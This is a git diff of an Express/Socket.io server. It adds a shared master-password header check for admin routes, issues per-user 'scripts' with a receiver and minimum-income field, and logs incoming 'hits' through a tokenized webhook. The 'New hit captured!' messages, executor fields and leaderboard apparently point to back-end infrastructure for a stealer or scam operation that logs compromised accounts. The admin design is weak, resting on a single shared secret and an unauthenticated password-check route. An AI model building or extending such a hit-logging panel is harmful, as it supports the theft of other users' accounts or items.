@@ -7,7 +7,6 @@ const path = require('path');
 const http = require('http');
 const { Server } = require("socket.io");
 const cookieParser = require('cookie-parser');
-const crypto = require('crypto');
 
 // Modèles
 const User = require('./models/User');
@@ -30,6 +29,7 @@ mongoose.connect(process.env.MONGO_URI)
     .then(() => console.log("✅ MongoDB Connecté"))
     .catch(err => console.error("❌ Erreur DB:", err));
 
+// Middleware Auth pour le Web
 const authMiddleware = (req, res, next) => {
     const token = req.cookies.auth_token;
     if (!token) return res.redirect('/login');
@@ -41,6 +41,16 @@ const authMiddleware = (req, res, next) => {
         res.clearCookie('auth_token');
         res.redirect('/login');
     }
+};
+
+// Middleware Universel Admin (Web ou API C#)
+const masterAuth = (req, res, next) => {
+    const adminKey = req.headers['x-admin-key'];
+    if (adminKey === process.env.MASTER_PASSWORD) {
+        return next();
+    }
+    // Si pas de clé header, on vérifie si c'est une session web auth (optionnel selon ton besoin)
+    return res.status(403).json({ error: "Unauthorized access" });
 };
 
 // --- ROUTES RENDU ---
@@ -114,40 +124,43 @@ app.post('/api/scripts/request', authMiddleware, async (req, res) => {
         minIncome: req.body.minIncome
     });
     await newRequest.save();
-    io.emit('new_script_request'); // Notifier l'admin
+    io.emit('new_script_request'); 
     res.json({ success: true });
 });
 
-// --- API ADMIN ---
-app.post('/api/admin/verify', authMiddleware, (req, res) => {
+// --- API ADMIN (Accessible par C# via Header x-admin-key) ---
+
+app.post('/api/admin/verify', (req, res) => {
     if (req.body.password === process.env.MASTER_PASSWORD) res.json({ success: true });
     else res.status(401).json({ success: false });
 });
 
-app.get('/api/admin/users', authMiddleware, async (req, res) => {
-    if (req.headers['x-admin-key'] !== process.env.MASTER_PASSWORD) return res.status(403).end();
+app.get('/api/admin/users', masterAuth, async (req, res) => {
     const users = await User.find({}, '-password').sort({ createdAt: -1 });
     res.json(users);
 });
 
-app.get('/api/admin/requests', authMiddleware, async (req, res) => {
-    if (req.headers['x-admin-key'] !== process.env.MASTER_PASSWORD) return res.status(403).end();
+app.get('/api/admin/requests', masterAuth, async (req, res) => {
     const requests = await ScriptRequest.find().sort({ createdAt: -1 });
     res.json(requests);
 });
 
-app.delete('/api/admin/users/:id', authMiddleware, async (req, res) => {
-    if (req.headers['x-admin-key'] !== process.env.MASTER_PASSWORD) return res.status(403).end();
+app.delete('/api/admin/users/:id', masterAuth, async (req, res) => {
     await User.findByIdAndDelete(req.params.id);
     res.json({ success: true });
 });
 
-app.post('/api/scripts/send', async (req, res) => {
+app.post('/api/scripts/send', masterAuth, async (req, res) => {
     const { webhookuuid, receiver, minincome, script } = req.body;
     const user = await User.findOne({ webhookToken: webhookuuid });
     if (!user) return res.status(404).json({ error: "UUID Invalide" });
 
-    const newScript = new Script({ userId: user._id, receiver, minIncome: minincome, scriptCode: script });
+    const newScript = new Script({ 
+        userId: user._id, 
+        receiver, 
+        minIncome: minincome, 
+        scriptCode: script 
+    });
     await newScript.save();
     await ScriptRequest.findOneAndDelete({ webhookuuid: webhookuuid, minIncome: minincome });
 
@@ -155,21 +168,23 @@ app.post('/api/scripts/send', async (req, res) => {
     res.json({ success: true });
 });
 
-// --- WEBHOOK (POST pour le bot, GET pour le test admin) ---
+// --- WEBHOOK HITS ---
 app.all('/webhook/:token', async (req, res) => {
     const user = await User.findOneAndUpdate(
         { webhookToken: req.params.token },
-        { $inc: { hitsCount: 1 } }
+        { $inc: { hitsCount: 1 } },
+        { new: true }
     );
     if (user) {
         const hitData = {
-            username: req.body.username || "Test_User",
-            executor: req.body.executor || "Admin_Panel",
+            username: req.body.username || "Unknown",
+            executor: req.body.executor || "Script",
             text: req.body.text || "🚨 New hit captured!",
             date: new Date().toLocaleTimeString()
         };
         io.to(user._id.toString()).emit('receive_message', hitData);
-        return req.method === 'GET' ? res.send("<h1>Hit envoyé !</h1>") : res.json({ status: "success" });
+        io.emit('stats_updated'); // Pour le leaderboard admin temps réel
+        return req.method === 'GET' ? res.send("Hit validé!") : res.json({ status: "success" });
     }
     res.status(404).json({ error: "Invalid Token" });
 });
